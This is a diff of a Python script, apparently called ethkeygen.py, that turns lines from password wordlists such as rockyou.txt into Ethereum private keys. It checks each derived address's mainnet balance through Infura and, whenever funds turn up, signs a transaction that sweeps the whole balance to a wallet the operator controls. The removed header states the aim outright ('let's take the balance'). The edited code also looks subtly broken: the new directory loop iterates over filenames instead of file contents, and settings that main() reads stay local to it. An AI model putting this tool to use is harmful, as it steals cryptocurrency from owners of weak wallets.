@@ -1,46 +1,9 @@
 #!/usr/bin/env python3
 
-#############################################
-#
-# This script does the following:
-#	Pulls entropy from a given file (Rockyou.txt or a similar password list works)
-#	Creates an Ethereum wallet from this entropy
-#	Saves the public and private keys of this wallet into a CSV file for future use
-# 	Checks the balance
-# 	If we find a wallet with Ether in it, the keys are weak so let's take the balance
-#
-# Benefits:
-#	Multiple permutation attempts per entropy input
-# 	Dynamic fee generation (with changeable margin of safety) to ensure your transaction goes through
-#	Reporting of all generated keypairs into user-specified file
-#
-# How to use it:
-#	Install 'pip' and any packages this program needs, as listed in the import statements below
-#	Update the variables highlighted below
-#	Run with 'python ethkeygen.py'
-#	???
-#	Profit
-#
-# Project TODOs:
-# 	Move user-defined variables to a config file
-#	Add more comprehensive permutations
-#		main(), tempLine > maxByteLength - do every maxByteLength-length permutation of tempLine
-#		main(), maxByteLength else - do every permutation of padding (1L-255R, 2L-254R, 3L-253R, etc)
-#	Prompt user to change variable settings upon first running of the program
-#	Verbosity setting
-# 	Better error handling for web3 calls
-#	Check for any ERC tokens, not just Ether specifically
-#	Add more wordlists to source file
-#	Allow for other-language wordlists
-#	Pull in any source files in a directory
-# 	Check if this address ever had coins in it and if they were just stolen
-#	Generate mnemonic phrases for secondary fuzzing - https://github.com/de-centralized-systems/python-bip39/
-#
-#############################################
-
-import sys, csv, eth_utils
+import os, sys, csv, eth_utils
 from web3 import Web3
 from eth_account.account import Account
+from configparser import ConfigParser
 from sys import getsizeof # Why can't we just 'import sys'?
 
 __author__ = "Mark Rudnitsky"
@@ -49,44 +12,11 @@ __credits__ = ["Mark Rudnitsky"]
 __license__ = "GPLv3"
 __version__ = "1.1"
 __maintainer__ = "Mark Rudnitsky"
-__status__ = "Prototype"
-
-##### CHANGE THESE ASAP #####
-#
-# Entropy source (rockyou.txt or other password list is a good place to start)
-# Another useful tool: https://kalilinuxtutorials.com/cook/
-keygenFile = "rockyou.txt"
-# Filename of database for generated keypairs
-dictFileName = "generated-keypairs.csv"
-# The wallet we want to transfer found Ether to
-controlledWallet = "0x2e2b43E20FCFC44D4cfCB16A723270c7a0Bc914F"
-#
-### Transaction fee details ###
-#
-# Max gas we're willing to pay to make our transaction go through; 
-# 0 = set the gas price dyamically based on market conditions
-maxGasPerTx = 0
-# Percent above fee market rate we wnt to be at, 0-100
-# Setting this higher gives a higher chance your transaction will be included in the next block
-marginOfSafety = 0
-# Keep 'gasCost' constant unless you know what you're doing
-gasCost = 21000
-# To get current values for 'preferredPriorityFee': https://ethgasstation.info, https://etherscan.io/gastracker
-preferredPriorityFee = 4
-#
-### API Details ###
-#
-# Ethereum mainnet API access through Infura
-infuraKey = "UPDATE_TO_YOUR_OWN_API_KEY"
-# Infura HTTPS API
-connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey 
-# Infura Websockets API, uncomment if preferred
-#connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey
-#
-##### END CHANGE THESE ASAP #####
-
+__status__ = "Production"
+	
 # Connect to the APIs so we can interact with the Ethereum blockchain
 def connect(connectionUrl):
+	print("[INFO] Connecting to Ethereum mainnet ...")
 	if (connectionUrl.startswith('wss')): # Websockets
 		web3Instance = Web3(Web3.WebsocketProvider(connectionUrl))
 	else: # HTTP(S)
@@ -118,14 +48,17 @@ def reporting(pubKey, privKey, balance):
 def findANonZeroBalance(entropy, web3Instance):
 	# Create a wallet
 	pubKey, privKey = generateAddress(entropy)
+	if (verbosity > 2):
+		print("[INFO] Generated address: " + pubKey + " , testing for balances ...")
+	
 	balance = web3Instance.eth.getBalance(pubKey) # Balance in wei
-	#balance = web3.fromWei(balance, "ether") # Balance in Ether
 	
 	# Save relevant data
 	reporting(pubKey, privKey, balance)
 
 	# Jackpot
-	if (balance > 0): # 1 in 2^256 chance this condition is true	
+	if (balance > 0): # 1 in 2^256 chance this condition is true
+		print("[SUCCESS] Balance of " + web3.fromWei(balance, 'ether') + " ETH found in " + pubKey)
 		nonce = web3Instance.eth.getTransactionCount(pubKey, 'latest')
 		
 		# Calculate gas costs (EIP-1559 compliant)
@@ -133,14 +66,14 @@ def findANonZeroBalance(entropy, web3Instance):
 		if not baseFee:
 			baseFee = web3Instance.eth.getBlock("pending").baseFeePerGas
 		priorityFee = web3Instance.toWei(preferredPriorityFee, 'gwei')
-		marginOfSafety = 1 + (marginOfSafety / 100)
+		marginOfSafety = 1 + float(marginOfSafety / 100)
 		maxFee = web3.toWei((((2 * baseFee) + priorityFee) * marginOfSafety), 'gwei')
 		
 		# Generate a send-to-us transaction
 		tx = {
 			'from': pubKey,
 			'nonce': nonce,
-			'to': controlledWallet,
+			'to': ourControlledWallet,
 			'value': balance,
 			'gas': gasCost,
 			'maxFeePerGas': maxFee,
@@ -153,51 +86,104 @@ def findANonZeroBalance(entropy, web3Instance):
 
 # Main function
 def main():
-	print("[INFO] Connecting to Ethereum mainnet ... ")
+	# Set or check the values in the config file
+	print("[INFO] Checking " + os.getcwd() + "/ewcconfig.ini ...")
+	cfg = ConfigParser()
+	configFile = os.getcwd() + "/ewcconfig.ini"
+	if not os.path.exists(configFile):
+		print("[ERROR] No config file data set, collecting input now ...")
+		entropySourceDirectory = input(".  1) Enter your entropy source directory (Kali\'s default is /usr/share/wordlists/): ")
+		dictFileName = input(".  2) Enter a CSV filename to store generated keypairs: ")
+		ourControlledWallet = input(".  3) Enter the public address of the wallet to send found funds to: ")
+		maxGasPerTx = input(".  3) Enter the max gas you want to pay for transactions (Enter 0 to dynamically generate based on current market conditions): ")
+		marginOfSafety = input(".  4) Enter the percentage above the average gas fee you are willing to pay (0-100): ")
+		preferredPriorityFee = input(".  5) Enter your preferred priority fee (Goes to Ethereum miners, a good estimate is 4): ")
+		infuraKey = input(".  6) Enter your Infura API key: ")
+		connectionUrlSelection = input(".  7) Are you using HTTP or WebSockets? (Choose HTTP if you don't know): ")
+		if "http" in connectionUrlSelection.lower():
+			connectionUrl = "https://mainnet.infura.io/v3/" + infuraKey 
+		else:
+			connectionUrl = "wss://mainnet.infura.io/ws/v3/" + infuraKey
+		verbosity = input(".  8) Enter your preferred verbosity (0=essential, 1=per-file updates, 2=per-line updates, 3=per-address updates): ")
+		cfg["EWCSETTINGS"] = {
+			"entropySourceDirectory": str(entropySourceDirectory),
+			"dictFileName": str(dictFileName),
+			"ourControlledWallet": str(ourControlledWallet),
+			"maxGasPerTx": int(maxGasPerTx),
+			"marginOfSafety": int(marginOfSafety),
+			"preferredPriorityFee": int(preferredPriorityFee),
+			"infuraKey": str(infuraKey),
+			"connectionUrl": str(connectionUrl),
+			"verbosity": int(verbosity)
+		}
+		with open(configFile, 'w+') as conf:
+			cfg.write(conf)
+		print("[SUCCESS] Information saved in the configuration file " + configFile)
+	else:
+		cfg.read(configFile)
+		cfgSettingsData = cfg["EWCSETTINGS"]
+		entropySourceDirectory = str(cfgSettingsData["entropySourceDirectory"])
+		dictFileName = str(cfgSettingsData["dictFileName"])
+		ourControlledWallet = str(cfgSettingsData["ourControlledWallet"])
+		maxGasPerTx = int(cfgSettingsData["maxGasPerTx"])
+		marginOfSafety = int(cfgSettingsData["marginOfSafety"])
+		preferredPriorityFee = int(cfgSettingsData["preferredPriorityFee"])
+		infuraKey = str(cfgSettingsData["infuraKey"])
+		connectionUrl = str(cfgSettingsData["connectionUrl"])
+		verbosity = int(cfgSettingsData["verbosity"])
+
+
+	# Check the API connection
 	web3Instance = connect(connectionUrl)
+
 	print("[INFO] Generating keys, this will take a while ...")
 	# Open up our source of entropy
-	sourceFile = open(keygenFile)
+	for root, dirs, fileNames in os.walk(entropySourceDirectory):
+		print("[INFO] Pulling entropy from " + fileNames + "... ")
+		for sourceFile in fileNames:
+			if (verbosity > 0):
+				print("[INFO] Pulling entropy from " + sourceFile + "... ")
 
-	for lineNum, textLine in enumerate(sourceFile):
-		# Get the line from the file and format it for our Ethereum tools
-		tempLine = str(textLine).strip()
-		tempLine = bytes(tempLine, 'utf-8')
+			for lineNum, textLine in enumerate(sourceFile):
+				# Get the line from the file and format it for our Ethereum tools
+				tempLine = str(textLine).strip()
+				tempLine = bytes(tempLine, 'utf-8')
 
-		# Generate address permutations
-		tempLineByteLength = getsizeof(tempLine)
-		
-		# Do basic entropy permutations
-		# Only allowed keylengths are defined in BIP39 
-		for maxByteLength in [128, 160, 192, 224, 256]:
-			# Too long, just use the first or last maxByteLength bytes
-			if (tempLineByteLength > maxByteLength):
-				# First maxByteLength bytes
-				findANonZeroBalance(tempLine[:maxByteLength], web3Instance)
+				# Generate address permutations
+				tempLineByteLength = getsizeof(tempLine)
 
-				# Last maxByteLength bytes
-				findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:], web3Instance)
+				if (verbosity > 1):
+					print("[INFO] Conducting permuations on line \'" + tempLine + "\'... ")
+				# Do basic entropy permutations
+				# Only allowed keylengths are defined in BIP39 
+				for maxByteLength in [128, 160, 192, 224, 256]:
+					# Too long, just use the first or last maxByteLength bytes
+					if (tempLineByteLength > maxByteLength):
+						# First maxByteLength bytes
+						findANonZeroBalance(tempLine[:maxByteLength], web3Instance)
 
-			# Edge case - line doesn't exist or isnt working
-			elif (tempLineByteLength < 0):
-				findANonZeroBalance('', web3Instance)
+						# Last maxByteLength bytes
+						findANonZeroBalance(tempLine[len(tempLine) - maxByteLength:], web3Instance)
 
-			# Proper length entropy
-			else:
-				pad = maxByteLength - tempLineByteLength
+					# Edge case - line doesn't exist or isnt working
+					elif (tempLineByteLength < 0):
+						findANonZeroBalance('', web3Instance)
 
-				# Pad on the left
-				findANonZeroBalance(bytes(pad) + tempLine, web3Instance)
+					# Proper length entropy
+					else:
+						pad = maxByteLength - tempLineByteLength
+
+						# Pad on the left
+						findANonZeroBalance(bytes(pad) + tempLine, web3Instance)
 			
-				# Pad on the right
-				findANonZeroBalance(tempLine + bytes(pad), web3Instance)
+						# Pad on the right
+						findANonZeroBalance(tempLine + bytes(pad), web3Instance)
 
-				# Pad 50/50 Left/Right split
-				findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)), web3Instance)
+						# Pad 50/50 Left/Right split
+						findANonZeroBalance(bytes(int(pad / 2)) + tempLine + bytes(int(pad / 2)) + bytes(int(pad % 2)), web3Instance)
 				
 	print("[INFO] Keygen complete, please check \'" + dictFileName + "\' in this directory for details.")
-	sourceFile.close()
 
-# Main function
+# Redirect to main function
 if __name__=="__main__":
     main()
